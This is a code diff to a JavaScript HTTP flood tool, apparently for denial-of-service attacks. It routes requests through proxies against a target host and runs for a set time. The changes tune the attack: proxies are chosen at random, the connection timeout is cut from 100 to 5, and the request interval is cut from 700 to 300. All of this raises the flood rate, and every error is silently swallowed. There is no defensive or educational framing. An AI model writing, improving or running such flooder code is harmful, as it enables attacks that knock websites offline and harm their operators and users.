@@ -349,7 +349,7 @@ return result;
 }
 const randstrsValue = randstrs(10);
   function runFlooder() {
-    const proxyAddr = proxies[cluster.worker.id % proxies.length];
+    const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
   encoding_header = [
@@ -428,7 +428,7 @@ let headers = {
      host: parsedProxy[0],
      port: ~~parsedProxy[1],
      address: parsedTarget.host + ":443",
-     timeout: 100
+     timeout: 5
  };
  Socker.HTTP(proxyOptions, (connection, error) => {
     if (error) return
@@ -515,7 +515,7 @@ const request = client.request({
                
 
            }
-       }, 700);
+       }, 300);
     });
     client.on("close", () => {
       client.destroy();
@@ -541,4 +541,3 @@ setTimeout(StopScript, args.time * 1000);
 
 process.on('uncaughtException', error => {});
 process.on('unhandledRejection', error => {});
-
